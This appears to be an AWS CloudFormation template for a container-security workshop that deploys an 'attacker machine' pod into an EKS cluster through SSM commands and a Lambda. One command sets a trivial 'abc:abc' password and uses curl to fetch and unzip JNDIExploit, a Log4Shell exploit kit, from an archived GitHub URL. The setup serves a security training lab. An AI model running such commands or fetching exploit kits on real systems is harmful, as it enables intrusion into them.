AWSTemplateFormatVersion: 2010-09-09
Description: tdc-2022-techday-1 Cloud One Container Security - Attacks template

Parameters:
  QSS3BucketName:
    Type: 'AWS::SSM::Parameter::Value<String>'
    Default: QSS3BucketName
    Description: DO NOT CHANGE THIS VALUE
  QSS3KeyPrefix:
    Type: 'AWS::SSM::Parameter::Value<String>'
    Default: QSS3KeyPrefix
    Description: DO NOT CHANGE THIS VALUE

Resources:
  # IAM
  AttackerMachineRole:
    Type: AWS::IAM::Role
    Properties:
      AssumeRolePolicyDocument:
        Version: '2012-10-17'
        Statement:
        - Effect: Allow
          Principal:
            Service:
              - lambda.amazonaws.com
          Action:
            - sts:AssumeRole
      Path: "/"
      Policies:
      - PolicyName: AttackerMachineRolePolicy
        PolicyDocument:
          Version: '2012-10-17'
          Statement:
          - Effect: Allow
            Action:
              - ssm:SendCommand
            Resource:
              - arn:aws:ssm:*:*:document/DeployAttackerMachineDocument
              - arn:aws:ssm:*:*:document/SetPlayerPasswordDocument
  # Scripts
  DeployAttackerMachineDocument: 
    Type: AWS::SSM::Document
    Properties:
      Content:
        schemaVersion: "2.2"
        description: "DeployAttackerMachineDocument - Attack Story"
        mainSteps: 
            - 
                action: "aws:runShellScript"
                name: "runShellScript"
                inputs: 
                    workingDirectory: "{{.}}"
                    runCommand:
                    - !Sub "sudo /usr/local/bin/kubectl apply -f https://${QSS3BucketName}.s3.amazonaws.com/${QSS3KeyPrefix}challenges/file_storage_security/k8s/attackerMachine.yaml"
      DocumentType: Command
      Name: 'DeployAttackerMachineDocument'
  SetPlayerPasswordDocument:
    Type: AWS::SSM::Document
    Properties:
      Content:
        schemaVersion: "2.2"
        description: "SetPlayerPasswordDocument - Attack Story"
        mainSteps:
            -
                action: "aws:runShellScript"
                name: "runShellScript"
                inputs:
                    workingDirectory: "{{.}}"
                    runCommand:
                    # CRITICAL does this violate AWS's 'no pentesting' doctrine?
                    - "sudo /usr/local/bin/kubectl get pods -l app=attacker-machine -o jsonpath='{range .items[*]}{.status.containerStatuses[*].ready.true}{.metadata.name}{\"\\n\"}{end}' | xargs -I{} kubectl exec {} -- /bin/bash -c \"echo 'abc:abc' | chpasswd; usermod -l Player abc && sudo apt-get update && sudo apt-get install -y vim openjdk-8-jdk curl unzip && curl --output exploit.zip http://web.archive.org/web/20211211031401/https://objects.githubusercontent.com/github-production-release-asset-2e65be/314785055/a6f05000-9563-11eb-9a61-aa85eca37c76?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211211%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211211T031401Z&X-Amz-Expires=300&X-Amz-Signature=140e57e1827c6f42275aa5cb706fdff6dc6a02f69ef41e73769ea749db582ce0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=314785055&response-content-disposition=attachment%3B%20filename%3DJNDIExploit.v1.2.zip&response-content-type=application%2Foctet-stream && unzip exploit.zip\""
      DocumentType: Command
      Name: 'SetPlayerPasswordDocument'
# Lambda functions to run scripts
  LambdaFunctionRunDeployAttackerMachineDocument:
        Type: AWS::Lambda::Function
        Properties:
          Runtime: python3.8
          Timeout: 20
          Handler: index.lambda_handler
          Role: !GetAtt AttackerMachineRole.Arn
          Code:
            ZipFile: |
                  import json
                  import boto3

                  ssm = boto3.client('ssm')
                  region = 'us-east-1'

                  def lambda_handler(event, context):
                      response = ssm.send_command(
                        Targets = [ 
                            {
                                'Key': 'tag:Name',
                                'Values': ['EKSBastion'] 
                            } 
                        ],
                          DocumentName='DeployAttackerMachineDocument',
                          DocumentVersion='$DEFAULT',
                          TimeoutSeconds=123,
                          Comment='string'
                      )
